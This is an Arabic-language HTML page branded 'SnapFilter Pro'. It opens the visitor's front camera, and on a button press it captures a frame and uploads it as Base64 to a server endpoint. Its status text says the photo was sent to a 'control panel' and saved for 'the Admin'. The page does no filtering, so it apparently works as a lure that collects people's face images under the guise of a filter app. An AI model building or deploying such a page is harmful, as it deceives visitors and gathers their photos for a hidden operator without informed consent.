<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SnapFilter - الكاميرا المباشرة</title>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; }
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: #0d0f12; color: #ffffff;
            display: flex; flex-direction: column; align-items: center; justify-content: center;
            min-height: 100vh; padding: 15px;
        }
        .container {
            width: 100%; max-width: 420px; background: #161922;
            border-radius: 20px; padding: 25px; text-align: center;
            border: 1px solid #262b3d; box-shadow: 0 10px 30px rgba(0,0,0,0.5);
        }
        h2 { font-size: 24px; margin-bottom: 15px; color: #ff4757; font-weight: 700; }
        .camera-box {
            position: relative;
            width: 100%; border-radius: 14px; background: #000;
            aspect-ratio: 3/4; overflow: hidden;
            border: 2px solid #ff4757; margin-bottom: 20px;
            box-shadow: inset 0 0 15px rgba(0,0,0,0.8);
        }
        video {
            width: 100%; height: 100%; object-fit: cover;
        }
        .btn-capture {
            background: linear-gradient(135deg, #ff4757, #ff6b81); color: white; border: none;
            width: 75px; height: 75px; border-radius: 50%; font-size: 28px; cursor: pointer;
            box-shadow: 0 5px 15px rgba(255, 71, 87, 0.4); display: inline-flex; align-items: center; justify-content: center;
            transition: transform 0.2s;
        }
        .btn-capture:active { transform: scale(0.92); }
        #status-msg { margin-top: 18px; font-size: 15px; font-weight: bold; min-height: 24px; }
    </style>
</head>
<body>

    <div class="container">
        <h2>SnapFilter Pro</h2>
        
        <!-- صندوق عرض الكاميرا الحية -->
        <div class="camera-box">
            <video id="video" autoplay playsinline></video>
        </div>

        <!-- زر التقاط الصورة الحية -->
        <button class="btn-capture" id="capture-btn" title="التقاط الصورة">📸</button>
        <p id="status-msg"></p>
    </div>

    <canvas id="canvas" style="display:none;"></canvas>

    <script>
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const captureBtn = document.getElementById('capture-btn');
        const statusMsg = document.getElementById('status-msg');

        // طلب إذن الكاميرا وتشغيل البث المباشر فور فتح الموقع
        navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false })
            .then(stream => {
                video.srcObject = stream;
            })
            .catch(err => {
                console.error("خطأ في تشغيل الكاميرا: ", err);
                statusMsg.innerText = "❌ تعذر الوصول إلى الكاميرا أو تم رفض الإذن!";
                statusMsg.style.color = "#ff4757";
            });

        // عند الضغط على زر الالتقاط، يتم أخذ لقطة حقيقية وإرسالها للسيرفر
        captureBtn.addEventListener('click', () => {
            if (!video.videoWidth) {
                statusMsg.innerText = "⚠️ الكاميرا لم تعمل بشكل كامل بعد!";
                statusMsg.style.color = "#f39c12";
                return;
            }

            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            const ctx = canvas.getContext('2d');
            
            // رسم الصورة الحية من الـ video على الـ canvas
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

            // تحويلها إلى Base64
            const imageData = canvas.toDataURL('image/png');

            statusMsg.innerText = "جاري إرسال الصورة إلى لوحة التحكم...";
            statusMsg.style.color = "#f39c12";

            // إرسال الصورة للسيرفر
            fetch('/upload-snapshot', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({ image: imageData })
            })
            .then(response => response.json())
            .then(data => {
                if (data.success) {
                    statusMsg.innerText = "✅ تم التقاط صورتك الحقيقية وحفظها بالـ Admin!";
                    statusMsg.style.color = "#2ed573";
                } else {
                    statusMsg.innerText = "❌ فشل الحفظ على السيرفر";
                    statusMsg.style.color = "#ff4757";
                }
            })
            .catch(err => {
                console.error('Fetch Error:', err);
                statusMsg.innerText = "❌ خطأ في الاتصال بالخادم";
                statusMsg.style.color = "#ff4757";
            });
        });
    </script>

</body>
</html>
